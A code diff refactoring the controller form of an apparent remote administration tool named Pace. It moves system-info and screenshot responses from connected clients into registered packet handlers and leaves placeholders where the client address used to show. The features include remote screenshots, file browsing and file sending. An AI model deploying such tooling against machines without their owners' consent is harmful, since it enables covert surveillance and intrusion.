@@ -1,4 +1,5 @@
-﻿using Pace.Common.Network.Packets.Client;
+﻿using Pace.Common.Network.Packets;
+using Pace.Common.Network.Packets.Client;
 using Pace.Common.Network.Packets.Server;
 using Pace.Server.Forms;
 using Pace.Server.Network;
@@ -19,6 +20,7 @@ namespace Pace.Server.Forms
     public partial class MainForm : Form
     {
         private PaceServer server;
+        private PacketChannel packetChannel;
 
         public MainForm()
         {
@@ -33,6 +35,11 @@ namespace Pace.Server.Forms
             server = new PaceServer();
             server.ClientConnected += Server_ClientConnected;
             server.ClientDisconnected += Server_ClientDisconnected;
+            server.PacketReceived += Server_PacketReceived;
+
+            packetChannel = new PacketChannel();
+            packetChannel.RegisterHandler<GetSystemInfoResponsePacket>(SystemInformationHandler);
+            packetChannel.RegisterHandler<TakeScreenshotResponsePacket>(ScreenshotHandler);
 
             server.Start();
         }
@@ -56,28 +63,7 @@ namespace Pace.Server.Forms
                 MessageBoxIcon.Information
             );
 
-            var client = e.Client;
-
-            client.SendPacket(new GetSystemInfoRequestPacket());
-
-            var systemInfoResponse = (GetSystemInfoResponsePacket)client.ReadPacket();
-
-            string[] addressInfo = client.TcpClient.Client.RemoteEndPoint.ToString().Split(':');
-
-            clientListview.Invoke(new Action(() =>
-            {
-                string[] row =
-                {
-                        systemInfoResponse.Identifier,
-                        addressInfo[0],
-                        addressInfo[1],
-                        systemInfoResponse.Username,
-                        systemInfoResponse.ComputerName,
-                        systemInfoResponse.OS
-                };
-
-                clientListview.Items.Add(new ListViewItem(row));
-            }));
+            e.Client.SendPacket(new GetSystemInfoRequestPacket());
         }
 
         private void Server_ClientDisconnected(object sender, ClientConnectedEventArgs e)
@@ -88,6 +74,14 @@ namespace Pace.Server.Forms
                 MessageBoxButtons.OK,
                 MessageBoxIcon.Information
             );
+        }
+
+        private void Server_PacketReceived(object sender, PacketEventArgs e)
+        {
+            var packet = e.Packet;
+            var client = e.Client;
+
+            packetChannel.HandlePacket(packet);
         }
 
         private void fileExplorerMenuItem_Click(object sender, EventArgs e)
@@ -103,25 +97,6 @@ namespace Pace.Server.Forms
             server.ConnectedClients[clientListview.SelectedItems[0].Index].SendPacket(
                 new TakeScreenshotRequestPacket()
             );
-
-            var screenshotPacket = (TakeScreenshotResponsePacket)server.ConnectedClients[clientListview.SelectedItems[0].Index].ReadPacket();
-
-            byte[] screenshotBytes = screenshotPacket.ImageData;
-
-            using (var ms = new MemoryStream(screenshotBytes))
-            {
-                var image = new Bitmap(ms);
-
-                var now = DateTime.Now;
-                string fileName = $"{now.Day}-{now.Month}-{now.Year}-{now.Hour}-{now.Minute}-{now.Second}.png";
-
-                File.WriteAllBytes(Path.Combine("Data", "Screenshots", fileName), screenshotBytes);
-
-                using (var viewImageForm = new ViewImageForm(image))
-                {
-                    viewImageForm.ShowDialog();
-                }
-            }
         }
 
         private void sendFileMenuItem_Click(object sender, EventArgs e)
@@ -162,6 +137,50 @@ namespace Pace.Server.Forms
             using (var aboutForm = new AboutForm())
             {
                 aboutForm.ShowDialog();
+            }
+        }
+
+        private void SystemInformationHandler(object packet)
+        {
+            var systemInfoResponse = (GetSystemInfoResponsePacket)packet;
+
+            //string[] addressInfo = client.TcpClient.Client.RemoteEndPoint.ToString().Split(':');
+
+            clientListview.Invoke(new Action(() =>
+            {
+                string[] row =
+                {
+                        systemInfoResponse.Identifier,
+                        "REPLACE",
+                        "LATER",
+                        systemInfoResponse.Username,
+                        systemInfoResponse.ComputerName,
+                        systemInfoResponse.OS
+            };
+
+                clientListview.Items.Add(new ListViewItem(row));
+            }));
+        }
+
+        private void ScreenshotHandler(object packet)
+        {
+            var screenshotPacket = (TakeScreenshotResponsePacket)packet;
+
+            byte[] screenshotBytes = screenshotPacket.ImageData;
+
+            using (var ms = new MemoryStream(screenshotBytes))
+            {
+                var image = new Bitmap(ms);
+
+                var now = DateTime.Now;
+                string fileName = $"{now.Day}-{now.Month}-{now.Year}-{now.Hour}-{now.Minute}-{now.Second}.png";
+
+                File.WriteAllBytes(Path.Combine("Data", "Screenshots", fileName), screenshotBytes);
+
+                using (var viewImageForm = new ViewImageForm(image))
+                {
+                    viewImageForm.ShowDialog();
+                }
             }
         }
     }
